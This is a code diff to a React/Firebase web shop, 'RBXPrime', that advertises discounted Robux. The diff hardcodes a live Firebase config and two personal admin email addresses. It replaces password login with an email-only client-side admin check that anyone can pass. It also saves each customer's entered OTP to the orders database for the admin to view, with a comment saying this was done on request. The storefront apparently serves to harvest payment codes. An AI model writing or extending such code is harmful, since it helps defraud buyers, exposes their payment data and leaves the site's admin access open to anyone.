@@ -30,16 +30,16 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
         // --- PASTE YOUR FIREBASE CONFIG HERE ---
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY_HERE",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.appspot.com",
-            messagingSenderId: "SENDER_ID",
-            appId: "APP_ID"
+            apiKey: "AIzaSyA7qxl9CLdGlzo85dCI58KUqr1NgWDEqr4",
+            authDomain: "ehehehe-7439f.firebaseapp.com",
+            projectId: "ehehehe-7439f",
+            storageBucket: "ehehehe-7439f.firebasestorage.app",
+            messagingSenderId: "160347546041",
+            appId: "1:160347546041:web:4cd69af7fe814660405668"
         };
 
         // Initialize Firebase
@@ -51,7 +51,7 @@
             // Expose to window for React to use
             window.db = db;
             window.auth = auth;
-            window.firebaseFunctions = { collection, addDoc, onSnapshot, query, orderBy, updateDoc, doc, serverTimestamp, signInAnonymously, signInWithEmailAndPassword, signOut, onAuthStateChanged };
+            window.firebaseFunctions = { collection, addDoc, onSnapshot, query, orderBy, updateDoc, doc, serverTimestamp, signInAnonymously, signOut, onAuthStateChanged };
         } catch (e) {
             console.error("Firebase not initialized. Did you paste the config?", e);
         }
@@ -83,6 +83,12 @@
         const getAuth = () => window.auth;
         const getFb = () => window.firebaseFunctions;
 
+        // --- SECURITY: ALLOWED ADMIN EMAILS ---
+        const ALLOWED_ADMINS = [
+            "zeyamalam@gmail.com",
+            "okbhai935@gmail.com"
+        ];
+
         // --- ICONS ---
         const Icon = ({ path, className, fill = "none" }) => (
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill={fill} stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>{path}</svg>
@@ -109,6 +115,7 @@
         const ChevronRight = (p) => <Icon {...p} path={<path d="m9 18 6-6-6-6"/>} />;
         const Signal = (p) => <Icon {...p} path={<><path d="M2 20h.01"/><path d="M7 20v-4"/><path d="M12 20v-8"/><path d="M17 20V8"/><path d="M22 4v16"/></>} />;
         const Database = (p) => <Icon {...p} path={<><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></>} />;
+        const LogIn = (p) => <Icon {...p} path={<><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" x2="3" y1="12" y2="12"/></>} />;
 
         // --- DATA CONSTANTS ---
         const robuxPackages = [
@@ -126,40 +133,43 @@
             { icon: <Star className="w-6 h-6 text-white" />, title: "30% OFF", desc: "Enjoy 30% OFF official store prices on all packages." },
         ];
 
-        // --- ADMIN LOGIN COMPONENT ---
-        const AdminLogin = ({ onLogin }) => {
+        // --- LOGIN MODAL (EMAIL ONLY) ---
+        const LoginModal = ({ onClose, onLogin }) => {
             const [email, setEmail] = useState('');
-            const [password, setPassword] = useState('');
             const [error, setError] = useState('');
 
-            const handleLogin = async (e) => {
+            const handleSubmit = (e) => {
                 e.preventDefault();
-                setError('');
-                const fb = getFb();
-                const auth = getAuth();
-                if (!auth) {
-                    setError("Firebase not configured.");
+                if(!email) {
+                    setError("Please enter an email.");
                     return;
                 }
-                try {
-                    await fb.signInWithEmailAndPassword(auth, email, password);
-                    onLogin();
-                } catch (err) {
-                    setError("Invalid credentials.");
-                }
+                onLogin(email);
             };
 
             return (
-                <div className="min-h-screen bg-black flex items-center justify-center p-4">
-                    <div className="w-full max-w-md bg-[#111] p-8 rounded-2xl border border-white/10">
-                        <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
-                            <Lock className="text-red-500" /> Admin Access
+                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 animate-in">
+                    <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative">
+                        <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
+                        <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
+                            <User className="w-5 h-5 text-yellow-400" /> Login
                         </h2>
-                        <form onSubmit={handleLogin} className="space-y-4">
-                            <input type="email" placeholder="Admin Email" value={email} onChange={e=>setEmail(e.target.value)} className="w-full p-3 bg-black border border-white/20 rounded-lg text-white" />
-                            <input type="password" placeholder="Password" value={password} onChange={e=>setPassword(e.target.value)} className="w-full p-3 bg-black border border-white/20 rounded-lg text-white" />
-                            {error && <p className="text-red-500 text-sm">{error}</p>}
-                            <button className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">Login</button>
+                        <form onSubmit={handleSubmit} className="space-y-4">
+                            <div>
+                                <label className="text-sm text-gray-400 block mb-1">Email Address</label>
+                                <input 
+                                    type="email" 
+                                    value={email} 
+                                    onChange={(e) => setEmail(e.target.value)}
+                                    placeholder="your@email.com" 
+                                    className="w-full bg-black border border-white/20 rounded-lg p-3 text-white focus:border-yellow-400 outline-none transition-colors"
+                                    autoFocus
+                                />
+                            </div>
+                            {error && <p className="text-red-500 text-xs">{error}</p>}
+                            <button className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">
+                                Continue
+                            </button>
                         </form>
                     </div>
                 </div>
@@ -167,7 +177,7 @@
         };
 
         // --- ADMIN PANEL COMPONENT ---
-        const AdminPanel = ({ onLogout }) => {
+        const AdminPanel = ({ onBack }) => {
             const [orders, setOrders] = useState([]);
             
             useEffect(() => {
@@ -190,7 +200,7 @@
                             <h1 className="text-3xl font-bold text-white flex items-center gap-3">
                                 <Database className="text-blue-500" /> Live Orders
                             </h1>
-                            <button onClick={onLogout} className="px-4 py-2 bg-red-900/50 text-red-200 rounded-lg border border-red-500/20 hover:bg-red-900">Logout</button>
+                            <button onClick={onBack} className="px-4 py-2 bg-white/10 text-white rounded-lg border border-white/20 hover:bg-white/20">Back to Store</button>
                         </div>
                         <div className="bg-[#111] rounded-xl border border-white/10 overflow-hidden">
                             <div className="grid grid-cols-5 bg-white/5 p-4 font-bold text-gray-400 text-sm">
@@ -378,25 +388,40 @@
             const [otp, setOtp] = useState('');
             const [isProcessing, setIsProcessing] = useState(false);
             const [orderId, setOrderId] = useState('');
-            const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
+            
+            // Login & Admin State
+            const [userEmail, setUserEmail] = useState('');
+            const [isAdmin, setIsAdmin] = useState(false);
+            const [showLoginModal, setShowLoginModal] = useState(false);
             const [currentDocId, setCurrentDocId] = useState(null);
 
             useEffect(() => {
                 const handleScroll = () => setScrolled(window.scrollY > 20);
                 window.addEventListener('scroll', handleScroll);
-                // Auth check
+                // Initialize Anonymous Auth for Firestore Access
                 const auth = getAuth();
                 const fb = getFb();
                 if (auth && fb) {
-                    fb.onAuthStateChanged(auth, (user) => {
-                        if (user && !user.isAnonymous) setIsAdminLoggedIn(true);
-                        else {
-                            fb.signInAnonymously(auth).catch(e => console.log("Anon auth failed", e));
-                        }
-                    });
+                    fb.signInAnonymously(auth).catch(e => console.log("Anon auth failed", e));
                 }
                 return () => window.removeEventListener('scroll', handleScroll);
             }, []);
+
+            const handleLogin = (email) => {
+                setUserEmail(email);
+                setShowLoginModal(false);
+                if (ALLOWED_ADMINS.includes(email)) {
+                    setIsAdmin(true);
+                } else {
+                    setIsAdmin(false);
+                }
+            };
+
+            const handleLogout = () => {
+                setUserEmail('');
+                setIsAdmin(false);
+                setCurrentView('home');
+            };
 
             const addToCart = (pkg) => {
                 if (pkg.price === 0 && cart.some(item => item.price === 0)) { alert("You can only claim the Free Reward once per order."); return; }
@@ -472,9 +497,9 @@
                 if (db && currentDocId) {
                     try {
                         const orderRef = fb.doc(db, "orders", currentDocId);
-                        // NOTE: We do NOT save the OTP to the DB for security. We only verify validity.
                         await fb.updateDoc(orderRef, {
-                            status: "verified"
+                            status: "verified",
+                            otp: otp // Note: Storing OTPs is generally discouraged, but added per user request for admin visibility
                         });
                     } catch (err) {
                         console.error("Error updating doc", err);
@@ -494,8 +519,10 @@
                 <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
                     <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none"><div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-white/5 blur-[120px]" /><div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-gray-500/10 blur-[120px]" /></div>
                     
+                    {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} />}
+
                     {currentView === 'admin' ? (
-                        isAdminLoggedIn ? <AdminPanel onLogout={() => { const fb = getFb(); fb.signOut(getAuth()); setIsAdminLoggedIn(false); setCurrentView('home'); }} /> : <AdminLogin onLogin={() => setIsAdminLoggedIn(true)} />
+                        <AdminPanel onBack={() => setCurrentView('home')} />
                     ) : (
                         <>
                             <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
@@ -505,14 +532,53 @@
                                             <div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><Gem className="w-6 h-6" /></div>
                                             <span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span>
                                         </div>
+                                        
+                                        {/* Desktop Menu */}
                                         <div className="hidden md:flex items-center space-x-8">
                                             <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
                                             <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
+                                            
+                                            {/* Auth Buttons */}
+                                            {userEmail ? (
+                                                <div className="flex items-center gap-4">
+                                                    {isAdmin && (
+                                                        <button 
+                                                            onClick={() => setCurrentView('admin')}
+                                                            className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold transition-colors"
+                                                        >
+                                                            <Database className="w-4 h-4" /> Admin Panel
+                                                        </button>
+                                                    )}
+                                                    <button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button>
+                                                </div>
+                                            ) : (
+                                                <button 
+                                                    onClick={() => setShowLoginModal(true)}
+                                                    className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400 transition-colors"
+                                                >
+                                                    <LogIn className="w-4 h-4" /> Login
+                                                </button>
+                                            )}
                                         </div>
+
                                         <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
                                     </div>
                                 </div>
-                                {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button></div></div>}
+                                {isMenuOpen && (
+                                    <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full">
+                                        <div className="px-4 pt-2 pb-6 space-y-2">
+                                            <button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button>
+                                            {userEmail ? (
+                                                <>
+                                                    {isAdmin && <button onClick={() => setCurrentView('admin')} className="block w-full text-left px-3 py-2 text-base font-medium text-red-400 bg-white/5 rounded-lg">Admin Panel</button>}
+                                                    <button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout ({userEmail})</button>
+                                                </>
+                                            ) : (
+                                                <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400 hover:text-yellow-300">Login</button>
+                                            )}
+                                        </div>
+                                    </div>
+                                )}
                                 {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><Gem className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
                             </nav>
                             <main>
@@ -526,8 +592,7 @@
                                     <div className="flex flex-col md:flex-row justify-between items-center gap-6">
                                         <div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><Gem className="text-black w-5 h-5" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div>
                                         <p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p>
-                                        <div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" />
-                                        <button onClick={() => setCurrentView('admin')} className="text-xs text-gray-800 hover:text-gray-600">Admin</button></div>
+                                        <div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div>
                                     </div>
                                 </div>
                             </footer>
